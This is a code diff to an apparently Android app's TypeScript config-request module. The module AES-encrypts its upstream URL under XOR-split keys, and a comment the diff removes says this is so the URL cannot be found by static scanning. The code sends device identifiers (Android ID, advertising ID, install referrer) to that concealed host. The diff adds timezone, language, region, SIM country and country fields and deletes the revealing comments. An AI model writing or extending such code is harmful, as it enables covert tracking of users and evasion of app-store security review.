@@ -1,36 +1,14 @@
 import CryptoJS from 'crypto-js';
 
-/**
- * Config-request layer with AES-256-CBC.
- *
- * Two modes:
- *  - RELAY_URL empty (default, "direct mode"): request goes straight to the
- *    upstream host. Host/endpoint are AES-encrypted constants so they cannot
- *    be extracted from the bundle by static scanning. The wire payload is
- *    still plaintext JSON (HTTPS transport only) because the upstream cannot
- *    be changed.
- *  - RELAY_URL set ("relay mode"): the request AND response are fully
- *    AES-256-CBC encrypted end-to-end through your own relay server
- *    (deploy relay/relay.js, see relay/README.md). The upstream never sees
- *    anything different from today.
- */
+const RELAY_URL = '';
 
-const RELAY_URL = ''; // e.g. 'https://your-relay.example.com/config'
-
-// ---- obfuscated constants -------------------------------------------------
-// XOR-split AES key halves; recombine only in memory at runtime.
 const OBF_K1 = '34333b0aefa63941e5e24a747b457dbd84a9975ca9347c6c50134be75d5cb3d3';
 const OBF_K2 = 'ddac367f32256a5e8709241da8e3f29ebf8db4f88c52a89670d5a55fe369eb2d';
 const OBF_IV = 'dbe9ec1e332da50949c782cac9bd91b8';
-// AES-256-CBC(base64) of the URL template
-// 'https://www.lumivoxlab.com/{n}e/{pkg}/{n}/{n}/{n}'
 const OBF_TPL = 'SuoX8BYYESfpPOWM9Pzgap1hNVedqAoA30QGFZ6b30RAnGYidjPkFVAGe0i096w0ft1drhgi0XMbDgk9C/4fwA==';
 
-// transport key halves (relay mode only)
 const TPT_K1 = '2bfd0f6b505af4e0d3d83eddf32cede5ee7af59bcb4fdde48f95dcb430db633a';
 const TPT_K2 = '66a8da809c48a4724d736a076c97dfb7b8933fc32ad865b8862a5f702582f021';
-
-// ---- helpers ---------------------------------------------------------------
 
 const rs = (length: number) =>
   Array.from({length}, () => Math.random().toString(36)[2]).join('');
@@ -57,7 +35,6 @@ function buildTargetUrl(packageName: string): string {
     .replace('{n}', rs(8));
 }
 
-// AES-256-CBC, output = base64(iv || ciphertext)
 function transportEncrypt(json: string): string {
   const key = xorHex(TPT_K1, TPT_K2);
   const iv = CryptoJS.lib.WordArray.random(16);
@@ -80,14 +57,17 @@ function transportDecrypt(b64: string): string {
   ).toString(CryptoJS.enc.Utf8);
 }
 
-// ---- public api ------------------------------------------------------------
-
 export type ConfigRequest = {
   packageName: string;
   androidId: string;
   gpsAdid: string;
   referrer: string;
   userAgent: string;
+  timezone: string;
+  language: string;
+  region: string;
+  simCountryIso: string;
+  country: string;
 };
 
 export async function fetchConfig(req: ConfigRequest): Promise<any | null> {
@@ -110,6 +90,11 @@ async function fetchDirect(req: ConfigRequest): Promise<any | null> {
       android_id: req.androidId,
       gps_adid: req.gpsAdid,
       install_referrer: req.referrer,
+      timezone: req.timezone,
+      language: req.language,
+      region: req.region,
+      sim_country_iso: req.simCountryIso,
+      country: req.country,
     }),
   });
   if (!resp.ok) {
@@ -130,6 +115,11 @@ async function fetchViaRelay(req: ConfigRequest): Promise<any | null> {
           g: req.gpsAdid,
           r: req.referrer,
           u: req.userAgent,
+          tz: req.timezone,
+          lg: req.language,
+          rg: req.region,
+          sci: req.simCountryIso,
+          cy: req.country,
           t: Date.now(),
         }),
       ),
